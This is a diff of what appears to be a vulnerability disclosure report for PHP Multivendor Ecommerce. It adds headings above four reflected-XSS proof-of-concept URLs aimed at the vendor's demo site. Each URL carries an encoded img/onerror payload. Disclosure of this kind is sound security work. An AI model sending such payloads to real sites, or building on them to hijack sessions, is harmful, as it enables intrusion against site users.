@@ -7,11 +7,15 @@ Well,  when I pentest the official demo site of PHP Multivendor Ecommerce, I fou
 
 ##### Reflect-XSS
 
+###### XSS1
+
 ```
 http://www.fxwebsolution.com/demo/arthi/multivendor/category.php?chid1=40%27%22%3E123%3Cimg%20src=x%20console.log(/xss/)%3E123%3C%27%22
 ```
 
 ![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/PHP-Multivendor-Ecommerce/xss1.png)
+
+###### XSS2
 
 ```
 http://www.fxwebsolution.com/demo/arthi/multivendor/seller-view.php?usid=60%27%22123%3Cimg%20src=x%20onerror=console.log(/xss2/)%3E123%3C%27%22
@@ -19,11 +23,16 @@ http://www.fxwebsolution.com/demo/arthi/multivendor/seller-view.php?usid=60%27%2
 
 ![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/PHP-Multivendor-Ecommerce/xss2.png)
 
+###### XSS3
+
 ```
 http://www.fxwebsolution.com/demo/arthi/multivendor/shopping-cart.php?cusid=60%27%22123%3Cimg%20src=x%20onerror=console.log(/xss3/)%3E123%3C%27%22
 ```
 
 ![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/PHP-Multivendor-Ecommerce/xss3.png)
+
+
+###### XSS4
 
 ````
 http://www.fxwebsolution.com/demo/arthi/multivendor/my_wishlist.php?fid=60%27%22123%3Cimg%20src=x%20onerror=console.log(/xss4/)%3E123%3C%27%22
